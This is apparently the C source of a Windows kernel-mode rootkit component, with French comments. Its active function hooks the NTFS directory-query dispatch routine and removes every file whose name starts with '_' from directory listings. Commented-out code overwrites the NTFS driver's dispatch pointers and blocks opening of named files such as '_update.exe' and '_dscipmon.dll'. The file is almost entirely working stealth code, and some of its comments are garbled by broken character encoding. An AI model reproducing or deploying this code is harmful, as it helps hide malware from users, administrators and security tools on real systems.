//#include "ntifs.h"
#include "IrpHideFile.h "

//#define NTFS L"\\filesystem\\ntfs"

//#pragma LOCKEDCODE
//char pHideFile[2][20]={"\\_dscipmon.dll","\\_dscipmonst.dll"};

//__declspec(dllimport) POBJECT_TYPE *IoDriverObjectType; //type export?par le noyau
//PDRIVER_OBJECT DrvNtfsObj;

#pragma LOCKEDCODE
NTSTATUS MyNtfsFsdDirectoryControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	ULONG Status;
	PIO_STACK_LOCATION pIOSL;
	
	PVOID FileInformation;
	FILE_INFORMATION_CLASS FIC;
	PFILE_DIRECTORY_INFORMATION pCurrentFDI, pPrevFDI;
	PFILE_FULL_DIR_INFORMATION pCurrentFFDI, pPrevFFDI;
	PFILE_BOTH_DIR_INFORMATION pCurrentFBDI, pPrevFBDI;
	PFILE_NAMES_INFORMATION pCurrentFNI, pPrevFNI;
	
	//DbgPrint("MyNtfsFsdDirectoryControl reached\n");
	
	//recup�re l'adresse de la current IO_STACK_LOCATION
	pIOSL=IoGetCurrentIrpStackLocation(Irp);
	
	//IrpSp->Parameters.QueryDirectory.FileInformationClass
	FIC=*(PULONG)((PUCHAR)pIOSL+0xC);
	
	//DbgPrint("FileInformationClass: 0x%x\n", FIC);
	
	if(pIOSL->MinorFunction!=IRP_MN_QUERY_DIRECTORY &&
		FIC!=FileDirectoryInformation && 
		FIC!=FileFullDirectoryInformation && 
		FIC!=FileBothDirectoryInformation && 
		FIC!=FileNamesInformation)
	return pRealNtfsFsdDirectoryControl(DeviceObject, Irp);
	
	FileInformation=Irp->UserBuffer;
	
	Status=pRealNtfsFsdDirectoryControl(DeviceObject, Irp);

	//DbgPrint("Status : 0x%x\n", Status);
	
	if(Status==STATUS_NO_MORE_FILES||Status==STATUS_NO_SUCH_FILE)
		return Status;
	
	switch(FIC)
	{

	case FileDirectoryInformation:
		
		pCurrentFDI=pPrevFDI=(PFILE_DIRECTORY_INFORMATION)FileInformation;

		do 
		{
			//DbgPrint("FileDirectoryInformation %S\n", &pCurrentFDI->FileName);
		
				if(pCurrentFDI->FileName[0]=='_')
				{
					if(pPrevFDI==pCurrentFDI) //si 1ere struct
					{	
						if(pCurrentFDI->NextEntryOffset!=0) //si ya une strut suivante 
							FileInformation=(PVOID)((PUCHAR)pCurrentFDI+pCurrentFDI->NextEntryOffset);
						else  //1 seul struct :s :s
						{
							Irp->IoStatus.Status=STATUS_NO_MORE_FILES;
							Irp->UserIosb->Status=STATUS_NO_MORE_FILES;
							return STATUS_NO_MORE_FILES;
							break;
						}
					}
					else //si pas 1ere struct
					{	
						if(pCurrentFDI->NextEntryOffset==0) //derniere struct
						{	
							pPrevFDI->NextEntryOffset=0;
							pPrevFDI=pCurrentFDI; //pour pouvoir leave
						}	
						else //cas normal
							pPrevFDI->NextEntryOffset+=pCurrentFDI->NextEntryOffset;
					}
				} //si pas de '_'
				else
					pPrevFDI=pCurrentFDI;	
		
			pCurrentFDI=(PFILE_DIRECTORY_INFORMATION)((PUCHAR)pCurrentFDI+pCurrentFDI->NextEntryOffset);

		}while(pCurrentFDI!=pPrevFDI);
	
	break;
	
	
	case FileFullDirectoryInformation:

		pCurrentFFDI=pPrevFFDI=(PFILE_FULL_DIR_INFORMATION)FileInformation;
		
		do 
		{
			//DbgPrint("FileFullDirectoryInformation %S\n", &pCurrentFFDI->FileName);
		
				if(pCurrentFFDI->FileName[0]=='_')
				{
					if(pPrevFFDI==pCurrentFFDI) //si 1ere struct
					{	
						if(pCurrentFFDI->NextEntryOffset!=0) //si ya une strut suivante 
							FileInformation=(PVOID)((PUCHAR)pCurrentFFDI+pCurrentFFDI->NextEntryOffset);
						else  //1 seul struct :s :s
						{
							Irp->IoStatus.Status=STATUS_NO_MORE_FILES;
							Irp->UserIosb->Status=STATUS_NO_MORE_FILES;
							return STATUS_NO_MORE_FILES;
							break;
						}
					}
					else //si pas 1ere struct
					{	
						if(pCurrentFFDI->NextEntryOffset==0) //derniere struct
						{	
							pPrevFFDI->NextEntryOffset=0;
							pPrevFFDI=pCurrentFFDI; //pour pouvoir leave
						}	
						else //cas normal
							pPrevFFDI->NextEntryOffset+=pCurrentFFDI->NextEntryOffset;
					}
				} //si pas de '_'
				else
					pPrevFFDI=pCurrentFFDI;	
		
			pCurrentFFDI=(PFILE_FULL_DIR_INFORMATION)((PUCHAR)pCurrentFFDI+pCurrentFFDI->NextEntryOffset);

		}while(pCurrentFFDI!=pPrevFFDI);
	
	break;
	
	
	case FileBothDirectoryInformation:

		//__asm{int 3}
		pCurrentFBDI=pPrevFBDI=(PFILE_BOTH_DIR_INFORMATION)FileInformation;
				
		do 
		{
			//DbgPrint("FileBothDirectoryInformation %S\n", &pCurrentFBDI->FileName);
		
				if(pCurrentFBDI->FileName[0]=='_')
				{
					//DbgPrint("Here ! Filename %S\n", pCurrentFBDI->FileName);
					
					if(pPrevFBDI==pCurrentFBDI) //si 1ere struct
					{	
						if(pCurrentFBDI->NextEntryOffset!=0) //si ya une strut suivante	 
							FileInformation=(PVOID)((PUCHAR)pCurrentFBDI+pCurrentFBDI->NextEntryOffset);
						else  //1 seul struct :s :s
						{
							Irp->IoStatus.Status=STATUS_NO_MORE_FILES;
							Irp->UserIosb->Status=STATUS_NO_MORE_FILES;
							return STATUS_NO_MORE_FILES;
							break;
						}
					}
					else //si pas 1ere struct
					{	
						if(pCurrentFBDI->NextEntryOffset==0) //derniere struct
						{	
							pPrevFBDI->NextEntryOffset=0;
							pPrevFBDI=pCurrentFBDI; //pour pouvoir leave
						}	
						else //cas normal
							pPrevFBDI->NextEntryOffset+=pCurrentFBDI->NextEntryOffset;
					}
				} //si pas de '_'
				else
					pPrevFBDI=pCurrentFBDI;	
		
			pCurrentFBDI=(PFILE_BOTH_DIR_INFORMATION)((PUCHAR)pCurrentFBDI+pCurrentFBDI->NextEntryOffset);

		}while(pCurrentFBDI!=pPrevFBDI);
	
	break;
	
	
	case FileNamesInformation:

		pCurrentFNI=pPrevFNI=(PFILE_NAMES_INFORMATION)FileInformation;
		do 
		{
			//DbgPrint("FileNamesInformation %S\n", &pCurrentFNI->FileName);
		
				if(pCurrentFNI->FileName[0]=='_')
				{
					if(pPrevFNI==pCurrentFNI) //si 1ere struct
					{	
						if(pCurrentFNI->NextEntryOffset!=0) //si ya une strut suivante 
							FileInformation=(PVOID)((PUCHAR)pCurrentFNI+pCurrentFNI->NextEntryOffset);
						else  //1 seul struct :s :s
						{
							Irp->IoStatus.Status=STATUS_NO_MORE_FILES;
							Irp->UserIosb->Status=STATUS_NO_MORE_FILES;
							return STATUS_NO_MORE_FILES;
							break;
						}
					}
					else //si pas 1ere struct
					{	
						if(pCurrentFNI->NextEntryOffset==0) //derniere struct
						{	
							pPrevFNI->NextEntryOffset=0;
							pPrevFNI=pCurrentFNI; //pour pouvoir leave
						}	
						else //cas normal
							pPrevFNI->NextEntryOffset+=pCurrentFNI->NextEntryOffset;
					}
				} //si pas de '_'
				else
					pPrevFNI=pCurrentFNI;	
		
			pCurrentFNI=(PFILE_NAMES_INFORMATION)((PUCHAR)pCurrentFNI+pCurrentFNI->NextEntryOffset);

		}while(pCurrentFNI!=pPrevFNI);
	
	break;
	}
	
	return Status;
}
/*
#pragma LOCKEDCODE
NTSTATUS MyNtfsFsdCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	ULONG Status;
	PIO_STACK_LOCATION pIOSL;
	PFILE_OBJECT pFO;
	int index = 0;
	//UNICODE_STRING usBouh;
	UNICODE_STRING usBouh1;
	ANSI_STRING ansi_hidefile;
	
	//DbgPrint("MyNtfsFsdCreate reached\n");
	
	//recup�re l'adresse de la current IO_STACK_LOCATION
	pIOSL=IoGetCurrentIrpStackLocation(Irp);
	pFO=pIOSL->FileObject;

	if(RtlCompareUnicodeString(&pFO->FileName, &usBouh, FALSE)==0)
	{	
		//DbgPrint("FileName : %S\n", pFO->FileName.Buffer);

		//
		//The contents of Irp->IoStatus are copied to Irp->UserIosb 
		//so that the originator of the I/O request can see the final status of the operation.
		//

		Irp->IoStatus.Status=STATUS_OBJECT_NAME_INVALID;
		Irp->UserIosb->Status=STATUS_OBJECT_NAME_INVALID;
		IofCompleteRequest(Irp, IO_NO_INCREMENT);

		return STATUS_OBJECT_NAME_INVALID;
	}
	Status=pRealNtfsFsdCreate(DeviceObject, Irp);
	
	//DbgPrint("Status : 0x%x\n", Status);	
	return Status;
}
*/ 
/*
NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("Bye Mofo !!\n");
	
	DrvNtfsObj->MajorFunction[IRP_MJ_CREATE]=pRealNtfsFsdCreate;
	DrvNtfsObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL]=pRealNtfsFsdDirectoryControl;
	
	return STATUS_SUCCESS;
}
*/ 
/*
NTSTATUS
ObReferenceObjectByName (
    __in PUNICODE_STRING ObjectName,
    __in ULONG Attributes,
    __in_opt PACCESS_STATE AccessState,
    __in_opt ACCESS_MASK DesiredAccess,
    __in POBJECT_TYPE ObjectType,
    __in KPROCESSOR_MODE AccessMode,
    __inout_opt PVOID ParseContext,
    __out PVOID *Object
    )

Routine Description:

    Given a name of an object this routine returns a pointer
    to the body of the object with proper ref counts

Arguments:

    ObjectName - Supplies the name of the object being referenced

    Attributes - Supplies the desired handle attributes

    AccessState - Supplies an optional pointer to the current access
        status describing already granted access types, the privileges used
        to get them, and any access types yet to be granted.

    DesiredAccess - Optionally supplies the desired access to the
        for the object

    ObjectType - Specifies the object type according to the caller

    AccessMode - Supplies the processor mode of the access

    ParseContext - Optionally supplies a context to pass down to the
        parse routine

    Object - Receives a pointer to the referenced object body

Return Value:

    An appropriate NTSTATUS value
*/
    
/*

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	ULONG Status;
	UNICODE_STRING usNtfs;

	pDriverObject->DriverUnload=DriverUnload;
	DbgPrint("Hello from KernelLand master\n");

	RtlInitUnicodeString(&usNtfs, NTFS);
	//RtlInitUnicodeString(&usBouh, L"\\_update.exe");
	//RtlInitUnicodeString(&usBouh1, L"\\_ip_map.txt");

	Status=ObReferenceObjectByName(&usNtfs,
								OBJ_CASE_INSENSITIVE,
								NULL,
								0,
								*IoDriverObjectType,
								KernelMode,
								NULL,
								&DrvNtfsObj);

	//sauvegarde l'adresse de NtfsFsdDirectoryControl
	pRealNtfsFsdDirectoryControl=DrvNtfsObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];
	
	//remplace la routine NtfsFsdDirectoryControl par la notre 
	DrvNtfsObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL]=MyNtfsFsdDirectoryControl;
	
	pRealNtfsFsdCreate=DrvNtfsObj->MajorFunction[IRP_MJ_CREATE];
	DrvNtfsObj->MajorFunction[IRP_MJ_CREATE]=MyNtfsFsdCreate;
	
	
	
	return STATUS_SUCCESS;	
}

#pragma LOCKEDCODE
NTSTATUS MyNtfsFsdCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
ULONG Status;
PIO_STACK_LOCATION pIOSL;
PFILE_OBJECT pFO;
int index = 0;
UNICODE_STRING usBouh;
UNICODE_STRING usBouh1;
ANSI_STRING ansi_hidefile;

//DbgPrint("MyNtfsFsdCreate reached\n");

//recup�re l'adresse de la current IO_STACK_LOCATION
pIOSL=IoGetCurrentIrpStackLocation(Irp);
pFO=pIOSL->FileObject;

//si c'est le fichier \_bouh.txt
for (index = 0; index < 2; index++ )
{
//memset(usBouh.Buffer,0,usBouh.MaximumLength);        //���һ��UNICODE_STRING	�ṹ
//memset(ansi_hidefile.Buffer,0,ansi_hidefile.MaximumLength);

RtlInitAnsiString(&ansi_hidefile, pHideFile[index]);           //��ʼ��һ��ANSI_STRING
RtlAnsiStringToUnicodeString(&usBouh,&ansi_hidefile,TRUE);        //ansistring to unicodestring

//DbgPrint("HideFileName : %S\n", usBouh.Buffer);
DbgPrint("FileName : %wZ\n",&usBouh);
DbgPrint("FileName1 : %wZ\n",&(pFO->FileName));
if(RtlCompareUnicodeString(&pFO->FileName, &usBouh, TRUE) == 0)
{	
DbgPrint("FileName2 : %S\n", usBouh.Buffer);

//
//The contents of Irp->IoStatus are copied to Irp->UserIosb 
//so that the originator of the I/O request can see the final status of the operation.
//
Irp->IoStatus.Status=STATUS_OBJECT_NAME_INVALID;
Irp->UserIosb->Status=STATUS_OBJECT_NAME_INVALID;
IofCompleteRequest(Irp, IO_NO_INCREMENT);
return STATUS_OBJECT_NAME_INVALID;
}

}
Status=pRealNtfsFsdCreate(DeviceObject, Irp);

//DbgPrint("Status : 0x%x\n", Status);	
return Status;
}
*/ 